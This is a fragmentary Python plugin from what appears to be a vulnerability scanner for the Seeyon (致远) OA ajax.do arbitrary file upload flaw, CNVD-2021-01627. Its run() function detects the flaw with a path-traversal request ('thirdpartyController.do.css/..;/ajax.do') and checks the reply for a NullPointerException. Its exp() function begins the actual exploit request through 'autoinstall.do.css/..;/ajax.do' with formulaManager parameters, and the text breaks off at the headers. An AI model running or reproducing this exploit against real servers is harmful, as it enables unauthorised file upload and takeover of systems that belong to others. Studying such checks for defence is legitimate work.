...
def msg():
  ...
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "致远OA ajax.do 任意文件上传 CNVD-2021-01627"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
...
def run(url,ua):
  ...
  target = '/seeyon/thirdpartyController.do.css/..;/ajax.do'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if res.status_code == 200 and 'java.lang.NullPointerException:null' in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
...
def exp(url):
  target = "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzurl"
  headers = {
